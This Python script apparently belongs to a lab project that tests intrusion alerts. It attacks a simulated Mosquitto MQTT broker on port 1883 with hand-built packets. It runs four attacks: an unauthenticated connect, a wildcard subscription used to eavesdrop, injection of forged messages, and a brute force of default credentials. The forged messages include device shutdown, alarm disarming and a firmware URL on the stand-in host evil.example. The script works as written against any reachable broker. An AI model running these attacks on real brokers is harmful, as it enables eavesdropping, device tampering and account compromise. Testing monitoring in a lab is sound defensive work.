"""
Attack Script: Mosquitto MQTT Broker (port 1883 — unencrypted)
==============================================================
Target  : Simulated Mosquitto broker (mosquitto_broker.py)
Default : 127.0.0.1:1883

Attacks performed
-----------------
1. UNENCRYPTED CONNECT   — connects via raw MQTT CONNECT on port 1883
                           → triggers UNENCRYPTED_MQTT alert immediately
2. WILDCARD SUBSCRIBE    — subscribes to '#' (all topics)
                           → eavesdrops on every message published to the broker
3. TOPIC INJECTION       — publishes malicious payloads to sensitive topics
                           → demonstrates message injection with no auth
4. CREDENTIAL BRUTE      — tries common username/password combinations
                           → shows weak/no auth on the unencrypted port

Raw MQTT packets are built manually so no external library is required.

Run order
---------
  1. python Devices/MQTT/mosquitto_broker.py   (start the broker)
  2. python Engines/main.py                    (start monitoring)
  3. python Attacks/attack_mosquitto.py        (run this script)

Expected monitoring alerts
--------------------------
  [UNENCRYPTED_MQTT]  — any TCP traffic on port 1883 triggers this alert
"""

import socket
import time
import struct
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
# Override with:  python attack_mosquitto.py <TARGET_IP> [TARGET_PORT]
# Docker example: python attack_mosquitto.py 172.17.0.8 1883
TARGET_IP   = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
TIMEOUT     = 3
# ─────────────────────────────────────────────────────────────────────────────


def print_banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


# ── MQTT PACKET BUILDERS ─────────────────────────────────────────────────────

def _encode_remaining_length(length):
    """Encode MQTT variable-length remaining length field."""
    encoded = []
    while True:
        byte = length % 128
        length //= 128
        if length > 0:
            byte |= 0x80
        encoded.append(byte)
        if length == 0:
            break
    return bytes(encoded)


def build_connect(client_id="attacker", username=None, password=None):
    """Build an MQTT CONNECT packet (protocol version 3.1.1)."""
    # Variable header
    protocol_name  = b'\x00\x04MQTT'
    protocol_level = b'\x04'          # version 3.1.1

    connect_flags = 0x02              # Clean Session
    if username:
        connect_flags |= 0x80
    if password:
        connect_flags |= 0x40

    keep_alive = struct.pack(">H", 60)

    # Payload — client ID
    cid_bytes = client_id.encode()
    payload   = struct.pack(">H", len(cid_bytes)) + cid_bytes

    if username:
        u = username.encode()
        payload += struct.pack(">H", len(u)) + u
    if password:
        p = password.encode()
        payload += struct.pack(">H", len(p)) + p

    variable_header = (
        protocol_name + protocol_level +
        bytes([connect_flags]) + keep_alive
    )
    body = variable_header + payload

    fixed_header = bytes([0x10]) + _encode_remaining_length(len(body))
    return fixed_header + body


def build_subscribe(topic="#", packet_id=1, qos=0):
    """Build an MQTT SUBSCRIBE packet."""
    t      = topic.encode()
    payload = struct.pack(">H", len(t)) + t + bytes([qos])
    body    = struct.pack(">H", packet_id) + payload
    fixed   = bytes([0x82]) + _encode_remaining_length(len(body))
    return fixed + body


def build_publish(topic, message, qos=0):
    """Build an MQTT PUBLISH packet (QoS 0)."""
    t       = topic.encode()
    m       = message.encode() if isinstance(message, str) else message
    body    = struct.pack(">H", len(t)) + t + m
    fixed   = bytes([0x30]) + _encode_remaining_length(len(body))
    return fixed + body


def build_disconnect():
    """Build an MQTT DISCONNECT packet."""
    return bytes([0xE0, 0x00])


def connect_to_broker(client_id="attacker", username=None, password=None):
    """Open a TCP connection and send MQTT CONNECT. Returns (socket, connack_code)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_IP, TARGET_PORT))

    pkt = build_connect(client_id, username, password)
    sock.sendall(pkt)

    resp = sock.recv(4)       # CONNACK is always 4 bytes
    if len(resp) >= 4 and resp[0] == 0x20:
        return sock, resp[3]  # byte 3 = return code (0 = accepted)
    return sock, -1


# ── ATTACK 1: UNENCRYPTED CONNECT ────────────────────────────────────────────
def attack_unencrypted_connect():
    print_banner("ATTACK 1: Unencrypted MQTT Connection (port 1883)")
    print(f"  Target : {TARGET_IP}:{TARGET_PORT}")
    print(f"  Action : Connecting via raw MQTT on the unencrypted port")
    print(f"  Alert  : UNENCRYPTED_MQTT — any traffic on port 1883 triggers this\n")

    try:
        sock, code = connect_to_broker(client_id="autosecure-attack-1")
        if code == 0:
            print("  CONNACK received: Connection ACCEPTED (return code 0)")
            print("  >> Broker accepted connection with NO authentication!")
        else:
            print(f"  CONNACK return code: {code}")
        sock.sendall(build_disconnect())
        sock.close()
    except ConnectionRefusedError:
        print("  Connection refused — is mosquitto_broker.py running?")
    except Exception as e:
        print(f"  Error: {e}")

    print("\n  >> UNENCRYPTED_MQTT alert should have fired in the monitoring engine")


# ── ATTACK 2: WILDCARD SUBSCRIBE ─────────────────────────────────────────────
def attack_wildcard_subscribe():
    print_banner("ATTACK 2: Wildcard Subscribe to All Topics (#)")
    print(f"  Target : {TARGET_IP}:{TARGET_PORT}")
    print(f"  Action : Subscribing to '#' to eavesdrop on all MQTT messages")
    print(f"  Alert  : UNENCRYPTED_MQTT (connection on port 1883)\n")

    try:
        sock, code = connect_to_broker(client_id="autosecure-eavesdrop")
        if code != 0:
            print(f"  Connection rejected (code {code})")
            sock.close()
            return

        print("  Connected. Sending SUBSCRIBE to '#' (all topics)...")
        sock.sendall(build_subscribe(topic="#", packet_id=1))

        # Wait briefly for SUBACK
        try:
            suback = sock.recv(5)
            if suback and suback[0] == 0x90:
                print("  SUBACK received — subscription to '#' ACCEPTED!")
                print("  >> Attacker is now receiving ALL messages from every topic")
            else:
                print(f"  Response bytes: {suback.hex()}")
        except socket.timeout:
            print("  No SUBACK received (simulated broker may not send one)")

        # Listen briefly for any published messages
        print("  Listening for incoming messages (3 seconds)...")
        sock.settimeout(3)
        try:
            while True:
                data = sock.recv(1024)
                if data:
                    print(f"  Intercepted message bytes: {data.hex()}")
        except socket.timeout:
            print("  No messages received in window")

        sock.sendall(build_disconnect())
        sock.close()

    except ConnectionRefusedError:
        print("  Connection refused — is mosquitto_broker.py running?")
    except Exception as e:
        print(f"  Error: {e}")


# ── ATTACK 3: MALICIOUS TOPIC INJECTION ──────────────────────────────────────
def attack_topic_injection():
    print_banner("ATTACK 3: Malicious Message Injection")
    print(f"  Target : {TARGET_IP}:{TARGET_PORT}")
    print(f"  Action : Publishing attacker payloads to sensitive topics")
    print(f"  Alert  : UNENCRYPTED_MQTT\n")

    malicious_messages = [
        ("sensors/temperature/data",  '{"value": 9999, "injected": true}'),
        ("sensors/humidity/data",     '{"value": -1,   "injected": true}'),
        ("device/command",            '{"cmd": "shutdown", "src": "attacker"}'),
        ("device/config",             '{"firmware_url": "http://evil.example/fw.bin"}'),
        ("home/alarm",                '{"state": "disarmed", "src": "attacker"}'),
    ]

    try:
        sock, code = connect_to_broker(client_id="autosecure-injector")
        if code != 0:
            print(f"  Connection rejected (code {code})")
            sock.close()
            return

        print("  Connected. Publishing malicious messages...\n")

        for topic, payload in malicious_messages:
            pkt = build_publish(topic, payload)
            sock.sendall(pkt)
            print(f"    Published → {topic}")
            print(f"      Payload : {payload}")
            time.sleep(0.1)

        sock.sendall(build_disconnect())
        sock.close()
        print("\n  >> All payloads injected with no authentication required")

    except ConnectionRefusedError:
        print("  Connection refused — is mosquitto_broker.py running?")
    except Exception as e:
        print(f"  Error: {e}")


# ── ATTACK 4: CREDENTIAL BRUTE FORCE ─────────────────────────────────────────
def attack_credential_brute():
    print_banner("ATTACK 4: MQTT Credential Brute Force")
    print(f"  Target : {TARGET_IP}:{TARGET_PORT}")
    print(f"  Action : Trying common username/password combinations")
    print(f"  Alert  : UNENCRYPTED_MQTT (repeated connections on port 1883)\n")

    credentials = [
        ("admin",    "admin"),
        ("admin",    "password"),
        ("admin",    "1234"),
        ("mqtt",     "mqtt"),
        ("user",     "user"),
        ("guest",    "guest"),
        ("root",     "root"),
        ("mosquitto","mosquitto"),
        (None,       None),           # Anonymous access
    ]

    for username, password in credentials:
        label = f"{username}:{password}" if username else "anonymous"
        try:
            sock, code = connect_to_broker(
                client_id=f"brute-{label[:8]}",
                username=username,
                password=password,
            )
            result = "ACCEPTED" if code == 0 else f"rejected (code {code})"
            print(f"    {label:25s} → {result}")
            sock.sendall(build_disconnect())
            sock.close()
            time.sleep(0.05)
        except ConnectionRefusedError:
            print("  Connection refused — is mosquitto_broker.py running?")
            break
        except Exception as e:
            print(f"    {label:25s} → Error: {e}")

    print("\n  >> Each attempt sent traffic on port 1883 — UNENCRYPTED_MQTT fires for each")


# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "#" * 60)
    print("#  AutoSecure Attack Simulation — Mosquitto MQTT Broker    #")
    print("#  Target  : port 1883 (unencrypted MQTT)                  #")
    print("#  FOR EDUCATIONAL / LAB USE ONLY                         #")
    print("#" * 60)
    print(f"\n  Target IP   : {TARGET_IP}")
    print(f"  Target Port : {TARGET_PORT}")
    print("\n  Docker: find container IP with:")
    print("    docker inspect --format '{{.NetworkSettings.IPAddress}}' autosecure-mqtt-mosquitto-1")
    print("  Or run:  python Attacks/get_docker_ips.py")
    print("\n  Make sure mosquitto_broker.py and the monitoring engine are running.")
    if "--auto" not in sys.argv:
        input("\n  Press Enter to begin attacks...")

    attack_unencrypted_connect()
    time.sleep(1)
    attack_wildcard_subscribe()
    time.sleep(1)
    attack_topic_injection()
    time.sleep(1)
    attack_credential_brute()

    print("\n" + "=" * 60)
    print("  All attacks complete.")
    print("  Check the monitoring engine output for triggered alerts.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
